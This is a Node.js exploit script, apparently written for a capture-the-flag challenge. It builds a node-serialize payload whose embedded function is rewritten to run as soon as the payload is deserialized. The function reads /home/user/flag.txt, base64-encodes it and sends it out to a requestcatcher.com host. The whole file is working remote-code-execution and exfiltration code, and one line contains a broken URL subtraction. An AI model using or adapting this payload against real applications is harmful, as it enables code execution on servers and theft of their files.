var serialize = require('node-serialize');
var urlencode = require('urlencode');

evil = [{"id":function(){

    		mysite = 'https://neptunian147.requestcatcher.com';

    		require('request')(mysite - '/working', function (error, response, body) { console.log(body); });

    		var fs = require('fs');
    		fs.readFile('/home/user/flag.txt', function(err, data) {
    			let base64flag = Buffer.from(data).toString('base64');

			    require('request')(mysite + '/working?flag=' + base64flag, function (error, response, body) { console.log(body); });
			  });

			},"quote":"Foundation comes first then the house, order matters.","author":"PwnFunction"}];

let buff = new Buffer.from(serialize.serialize(evil));

console.log('Evil Serialized:');
// buff2 = buff.toString('ascii');
buff2 = buff.toString('ascii').replace('}","quote', '}()","quote');
console.log(buff2 + '\n\n');